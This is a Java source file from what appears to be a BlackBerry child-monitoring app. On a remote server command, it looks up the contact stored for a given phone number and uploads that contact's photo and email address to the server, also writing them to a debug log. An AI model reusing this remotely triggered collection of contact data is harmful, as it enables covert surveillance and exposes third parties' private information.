package com.kids.Monitor.Contacts.ContactPic;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Vector;

import javax.microedition.pim.Contact;

import net.rim.blackberry.api.phone.Phone;
import net.rim.device.api.compress.GZIPOutputStream;
import net.rim.device.api.system.EncodedImage;

import com.kids.Controllable;
import com.kids.Logger;
import com.kids.net.Reply;
import com.kids.net.Server;
import com.kids.prototypes.Debug;
import com.kids.prototypes.LocalDataReader;
import com.kids.prototypes.LocalDataWriter;
import com.kids.prototypes.enums.COMMAND_TARGETS;
import com.kids.prototypes.enums.IMAGE_TYPES;


/**
 * This class can be used to retrieve the contact picture stored on the device based on a specified phone number that is sent in a command.
 */
public class ContactPicSdk5 extends ContactPic implements Controllable
{
	private LocalDataReader 	  actLog;
	private Server 				  myServer;
	private ContactPicMessage 	  flyContactPicMessage;
    static  Debug 				  logWriter     = Logger.getInstance();

	
/**
 * The constructor
 * 1. Passes the application context to the instance
 * 2. creates a server object
 * 3. Initialises a fly message to temporarily hold ContactPic messages
 * 
 * @param inputcontext Interface to global environment that the current application is running in.
 * @param inputLocalData Storage location for messages
 */
    /*
	public ContactPicSdk5()
	{
		context = inputcontext;
		//localData = inputLocalData;
		myServer = new Server(actLog);
		flyContactPicMessage = new ContactPicMessage();
		Controller.log("Starting.. ContactPic");
		
	}*/
	
	public void initialiseContactPic(LocalDataReader inputLocalData)
	{
		actLog 				 = inputLocalData;
		myServer 			 = new Server(actLog);
		flyContactPicMessage = new ContactPicMessage();
		logWriter.log("Starting.. ContactPic");
	}
	
/**
 * This method extracts the contact picture stored on the device
 * 
 * @param inputNumber picture to be extracted based on this phone number
 * @return a ContactPhotoContainer is return consisting of the contact picture, type of image and an email address, if specified in the contact
 */
	public ContactPhotoContainer getContactPhotoFromNumber(String inputNumber)
	{
		logWriter.log("In-> getContactPhotoFromNumber");
	    ContactPhotoContainer photoObject = new ContactPhotoContainer();

		Vector contactList = Phone.getContactsByPhoneNumber(inputNumber);
		Contact contact = null;
		byte[] byteStream = null;
		
		if (!contactList.isEmpty())
		{
			contact = (Contact) contactList.elementAt(0);
			byteStream = contact.getBinary(Contact.PHOTO, Contact.ATTR_NONE);
			
			EncodedImage contactPic = EncodedImage.createEncodedImage(byteStream, 0, byteStream.length); 
			String picType = String.valueOf( contactPic.getImageType() );
			
			photoObject.setPhoto(byteArrayToHexString(byteStream));//(byteArrayToHexString(gzippedData));
			photoObject.setPhotoType(getFileType(picType));//get+set the file type
			photoObject.setEmail(contact.getString(Contact.EMAIL, 0));//findEmail(id));//get+set the email address
			logWriter.log("Email=:"+photoObject.email);
			logWriter.log("FileType=:"+photoObject.photoType);

			//get the last line of the hex string
			int length = photoObject.photoStream.length();
			logWriter.log("Last values = Hex:"+photoObject.photoStream.substring((length - 100), length)+":");
			
			//get hex input stream string split into 100 character pieces
			int len = photoObject.photoStream.length();
			int count = 0, num = 100;
			while(count < len)
			{
				if (count == num)
				{
					logWriter.log("Contact Photo = Hex:"+photoObject.photoStream.substring((count - 100), count)+":");
					num += 100;
				}
				count++;
			}
		}			
		
		else
		{
			photoObject.photoStream = null;
			photoObject.photoType = null;
			photoObject.email = null;
		}		      
	 return photoObject;
	}

/**
 * This method converts the input stream into a gzip compressed byte array
 * 
 * @param input input stream
 * @return gzip byte array
 * @throws IOException
 */
	public byte[] gzipData(InputStream input) throws IOException
	{
		
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		GZIPOutputStream gzipos = new GZIPOutputStream(baos);
		readGzipData(input, gzipos);
		return baos.toByteArray();
	}

	 private static void readGzipData(InputStream input, OutputStream os) throws IOException
	 {  
	     byte[] buf = new byte[1024];  
	     int len = 0;  
	     InputStream is = null;  
	     try
	     {  
	         is = input; 
	         while ((len = is.read(buf)) > 0)
	         {  
	             os.write(buf, 0, len);  
	         } 
	         //TODO: Error on J2ME, but I don't think its needed anyway. Same for the 2 GZIP methods!
/*	         if (os instanceof DeflaterOutputStream)
	         {  
	             ((DeflaterOutputStream) os).finish();  
	         }*/  
	     }
	     finally
	     {  
	         if (is != null)
	         {  
	             is.close();  
	         }  
	     }  
	 }
	
/**
 * This method converts the byte stream from an input stream into a byte array
 * 
 * @param inputStream file input stream
 * @return input stream passed in the form of a byte array 
 * @throws IOException the thrown exceptions need to be caught when using this method
 */
	public byte[] readBytes(InputStream inputStream) throws IOException 
	{
		
		  // this dynamically extends to take the bytes you read
		  ByteArrayOutputStream byteBuffer = new ByteArrayOutputStream();
		  if(null != inputStream)
		  {	 // this is storage overwritten on each iteration with bytes
			  int bufferSize = 1024;
			  byte[] buffer = new byte[bufferSize];
	
			  // we need to know how may bytes were read to write them to the byteBuffer
			  int len = 0;
			  while ((len = inputStream.read(buffer)) != -1) 
			  { byteBuffer.write(buffer, 0, len);  }
		  }
		  else
		  {byteBuffer.write(0);}
		  
		  // and then we can return your byte array.
		  return byteBuffer.toByteArray();
	}
	
	
	 public String byteArrayToHexString(byte[] b) 
	 {
	    StringBuffer sb = new StringBuffer(b.length * 2);
	    for (int i = 0; i < b.length; i++) 
	    {
	      int v = b[i] & 0xff;
	      
	      if (v < 16)
	      {	sb.append('0');  }
	      
	      sb.append(Integer.toHexString(v));
	    }
	    return sb.toString().toUpperCase();
	 }
	
	public String getFileType(String picType)
	{	
		int theType=(int)Integer.parseInt(picType);
		String typeToReturn = null;

		switch(theType)
		{
		case 1:
			typeToReturn=IMAGE_TYPES.GIF;
			break;
		case 2:
			typeToReturn=IMAGE_TYPES.PNG;			
			break;
		case 3:
			typeToReturn=IMAGE_TYPES.JPEG;
			break;
		case 4:
			typeToReturn=IMAGE_TYPES.WBMP;
			break;
		case 5:
			typeToReturn=IMAGE_TYPES.BMP;
			break;
		case 6:
			typeToReturn=IMAGE_TYPES.TIFF;
			break;
		case 9:
			typeToReturn=IMAGE_TYPES.ICO;
			break;
		default:
			typeToReturn=IMAGE_TYPES.UNKNOWN;
			break;
		}

		return typeToReturn;
	}	
	
/**
 * This method has been overridden from the Controllable interface.
 * By implementing this interface this class can receive command arguments.
 * These commands are then processed within this method.
 * 
 * @param inputArgs arguments sent specifying the command instructions from the server.
 * @return true if the command has been processed with out any errors.
 */
	public boolean processCommand(String[] inputArgs) 
	{
		logWriter.log("Processing Contact Photo Command...");
		
		Reply resultREST;
		boolean complete = false;
		
		//check for valid command message
		if(true == containsOnlyNumbers(inputArgs[2]))
		{
			logWriter.log("args[0] :"+inputArgs[0]);
			if(inputArgs[0].equalsIgnoreCase("pic"))
			{
				if(inputArgs[1].equalsIgnoreCase("call"))
				{
					logWriter.log("args[1] :"+inputArgs[1]);
					logWriter.log("args[2] :"+inputArgs[2]);
					
					String contactNumber = inputArgs[2];
					
					//find picture
					ContactPhotoContainer photoPackage = getContactPhotoFromNumber(contactNumber);
					
					if(null != photoPackage.photoStream) 
					{					
						flyContactPicMessage.setMessage(photoPackage.photoType, contactNumber, photoPackage.email);
						
						logWriter.log("ADDING CONTACT PIC DATA");
				        
						//send picture message
						logWriter.log("Sending Contact Photo Command...");											//set CRC
						resultREST = myServer.contactServer(flyContactPicMessage.getREST(), String.valueOf(myServer.getCrcValue(photoPackage.photoStream)), photoPackage.photoStream);
						
						if(resultREST.isError() == false)
						{	complete = true;	}
						
						flyContactPicMessage.clearData();					
					}
					else
					{complete = true;}
				}
			}
		}
		else
		{complete = true;}
		
		return complete;
	}

	
/**
 * This method has been overridden from the Controllable interface.
 * By implementing this interface this class can specify the type of commands it can process.
 * 
 * @param target passed to be checked.
 * @return true if this is the desired target.
 */
	public boolean isTarget(COMMAND_TARGETS targets) 
	{
		if(targets.toString() == COMMAND_TARGETS.CONTACTS)
		{return true;} 
		else 
		{return false;}
	}
	
/**
 * This method ensures that a string only contains numbers
 * 
 * @param str the string to be checked
 * @return true if the string contains a non-number character
 */
    public boolean containsOnlyNumbers(String str) {
        
        //It can't contain only numbers if it's null or empty...
        if (str == null || str.length() == 0)
            return false;
        
        for (int i = 0; i < str.length(); i++) {

            //If we find a non-digit character we return false.
            if (!Character.isDigit(str.charAt(i)))
                return false;
        }
        
        return true;
    }

	public boolean isTarget(String arg0)
	{
		// TODO Auto-generated method stub
		return false;
	}

	public void initialiseContactPic(LocalDataWriter inputLocalData)
	{
		// TODO Auto-generated method stub
		
	}
}